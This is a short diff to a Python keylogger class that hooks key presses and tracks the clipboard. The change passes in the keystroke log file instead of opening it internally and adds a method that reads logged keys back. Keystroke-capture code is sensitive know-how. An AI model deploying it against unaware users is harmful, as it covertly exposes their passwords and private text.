@@ -28,12 +28,11 @@ def event_to_string(event):
 
 
 class KeysClipboardLogger:
-    def __init__(self, csv_file):
+    def __init__(self, csv_file, txt_file):
         self.old_clipboard = None
         self.current_clipboard = None
         self.working_file = csv_file
-        self.current_keys_file = open("current_keys_file.txt", "w")
-
+        self.current_keys_file = txt_file
         self.start_keylogger()
 
     # def log_clipboard(self):
@@ -49,6 +48,9 @@ class KeysClipboardLogger:
             self.current_keys_file.write(event_to_string(event))
 
         kb.on_press(on_press)
+
+    def get_current_logged_keys(self):
+        return self.current_keys_file.readline()
 
 
 def main():
